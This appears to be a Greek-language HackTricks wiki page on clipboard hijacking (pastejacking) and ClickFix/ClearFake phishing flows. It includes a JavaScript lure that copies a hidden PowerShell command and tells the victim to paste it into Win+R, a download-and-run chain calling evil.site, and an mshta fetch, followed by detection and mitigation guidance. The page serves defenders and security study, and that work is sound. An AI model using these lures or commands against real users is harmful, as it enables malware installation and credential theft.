# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Ποτέ μην επικολλάτε οτιδήποτε δεν έχετε αντιγράψει εσείς οι ίδιοι." – παλιά αλλά ακόμα έγκυρη συμβουλή

## Overview

Clipboard hijacking – επίσης γνωστό ως *pastejacking* – εκμεταλλεύεται το γεγονός ότι οι χρήστες συνήθως αντιγράφουν και επικολλούν εντολές χωρίς να τις ελέγχουν. Μια κακόβουλη ιστοσελίδα (ή οποιοδήποτε περιβάλλον που υποστηρίζει JavaScript, όπως μια εφαρμογή Electron ή Desktop) τοποθετεί προγραμματισμένα κείμενο ελεγχόμενο από τον επιτιθέμενο στο σύστημα clipboard. Τα θύματα ενθαρρύνονται, συνήθως μέσω προσεκτικά σχεδιασμένων οδηγιών κοινωνικής μηχανικής, να πατήσουν **Win + R** (διάλογος Εκτέλεσης), **Win + X** (Γρήγορη Πρόσβαση / PowerShell), ή να ανοίξουν ένα τερματικό και να *επικολλήσουν* το περιεχόμενο του clipboard, εκτελώντας αμέσως αυθαίρετες εντολές.

Επειδή **δεν κατεβαίνει κανένα αρχείο και δεν ανοίγει καμία συνημμένη**, η τεχνική παρακάμπτει τους περισσότερους ελέγχους ασφαλείας email και διαδικτυακού περιεχομένου που παρακολουθούν συνημμένα, μακροεντολές ή άμεση εκτέλεση εντολών. Η επίθεση είναι επομένως δημοφιλής σε εκστρατείες phishing που παραδίδουν οικογένειες κακόβουλου λογισμικού όπως NetSupport RAT, Latrodectus loader ή Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Οι παλαιότερες εκστρατείες χρησιμοποιούσαν `document.execCommand('copy')`, ενώ οι νεότερες βασίζονται στο ασύγχρονο **Clipboard API** (`navigator.clipboard.writeText`).

## Η Ροή ClickFix / ClearFake

1. Ο χρήστης επισκέπτεται μια typosquatted ή παραβιασμένη ιστοσελίδα (π.χ. `docusign.sa[.]com`)
2. Ο injected **ClearFake** JavaScript καλεί έναν `unsecuredCopyToClipboard()` helper που αποθηκεύει σιωπηλά μια Base64-encoded PowerShell one-liner στο clipboard.
3. Οι HTML οδηγίες λένε στο θύμα να: *“Πατήστε **Win + R**, επικολλήστε την εντολή και πατήστε Enter για να επιλύσετε το πρόβλημα.”*
4. Το `powershell.exe` εκτελείται, κατεβάζοντας ένα αρχείο που περιέχει ένα νόμιμο εκτελέσιμο καθώς και ένα κακόβουλο DLL (κλασικό DLL sideloading).
5. Ο loader αποκρυπτογραφεί επιπλέον στάδια, εισάγει shellcode και εγκαθιστά επιμονή (π.χ. προγραμματισμένο έργο) – τελικά εκτελεί το NetSupport RAT / Latrodectus / Lumma Stealer.

### Παράδειγμα Αλυσίδας NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (νόμιμο Java WebStart) αναζητά το κατάλογό του για το `msvcp140.dll`.
* Η κακόβουλη DLL επιλύει δυναμικά APIs με **GetProcAddress**, κατεβάζει δύο δυαδικά αρχεία (`data_3.bin`, `data_4.bin`) μέσω **curl.exe**, τα αποκρυπτογραφεί χρησιμοποιώντας ένα κυλιόμενο κλειδί XOR `"https://google.com/"`, εισάγει τον τελικό shellcode και αποσυμπιέζει το **client32.exe** (NetSupport RAT) στο `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Κατεβάζει το `la.txt` με **curl.exe**
2. Εκτελεί τον JScript downloader μέσα στο **cscript.exe**
3. Ανακτά ένα MSI payload → ρίχνει το `libcef.dll` δίπλα σε μια υπογεγραμμένη εφαρμογή → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer μέσω MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Η **mshta** κλήση εκκινεί ένα κρυφό PowerShell script που ανακτά το `PartyContinued.exe`, εξάγει το `Boat.pst` (CAB), ανακατασκευάζει το `AutoIt3.exe` μέσω του `extrac32` & της συγχώνευσης αρχείων και τελικά εκτελεί ένα `.a3x` script που εξάγει τα διαπιστευτήρια του προγράμματος περιήγησης στο `sumeriavgv.digital`.

## Ανίχνευση & Κυνήγι

Οι ομάδες Blue μπορούν να συνδυάσουν την τηλεμετρία clipboard, δημιουργίας διαδικασιών και μητρώου για να εντοπίσουν την κακή χρήση του pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` διατηρεί ιστορικό εντολών **Win + R** – αναζητήστε ασυνήθιστες εγγραφές Base64 / obfuscated.
* Security Event ID **4688** (Δημιουργία Διαδικασίας) όπου `ParentImage` == `explorer.exe` και `NewProcessName` σε { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** για δημιουργίες αρχείων κάτω από `%LocalAppData%\Microsoft\Windows\WinX\` ή προσωρινά φακέλους αμέσως πριν από το ύποπτο γεγονός 4688.
* EDR clipboard sensors (αν υπάρχουν) – συσχετίστε `Clipboard Write` που ακολουθείται αμέσως από μια νέα διαδικασία PowerShell.

## Μετριασμοί

1. Σκληροποίηση προγράμματος περιήγησης – απενεργοποιήστε την πρόσβαση εγγραφής clipboard (`dom.events.asyncClipboard.clipboardItem` κ.λπ.) ή απαιτήστε χειρονομία χρήστη.
2. Ευαισθητοποίηση ασφαλείας – διδάξτε στους χρήστες να *πληκτρολογούν* ευαίσθητες εντολές ή να τις επικολλούν πρώτα σε έναν επεξεργαστή κειμένου.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control για να αποκλείσετε αυθαίρετους one-liners.
4. Δίκτυα ελέγχου – αποκλείστε τις εξερχόμενες αιτήσεις σε γνωστούς τομείς pastejacking και κακόβουλου λογισμικού C2.

## Σχετικά Τέχνασμα

* **Discord Invite Hijacking** συχνά εκμεταλλεύεται την ίδια προσέγγιση ClickFix μετά την παγίδευση χρηστών σε έναν κακόβουλο διακομιστή:
{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Αναφορές

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)

{{#include ../../banners/hacktricks-training.md}}
